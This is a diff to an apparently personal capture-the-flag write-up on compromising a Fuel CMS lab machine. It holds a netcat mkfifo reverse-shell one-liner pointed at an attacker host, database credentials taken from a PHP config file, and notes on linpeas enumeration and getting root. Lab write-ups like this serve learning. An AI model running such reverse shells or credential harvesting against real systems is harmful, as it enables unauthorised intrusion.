@@ -58,7 +58,7 @@ http://10.10.192.215/fuel/pages/select/?nocache=1507880376191&input=&target=&tit
 
 - I got an exploit that allowed remote code execution on the target system, through fuel cms. About to get reverse shell now.
 ```
-"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.29.246 9999 >/tmp/f"
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9999 >/tmp/f"
 
 ```
 
@@ -106,3 +106,33 @@ usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
 mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
 
 ```
+
+
+- I was looking around the php files in the fuel directory and found this. Meanwhile my linpeas script is also running... lemme go and check what it found.
+```php
+$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+);
+```
+
+- Linpeas didnt bring anything useful to the table. I got root which i couldnt wait to get and boom got the flag LOL! ...
+
+
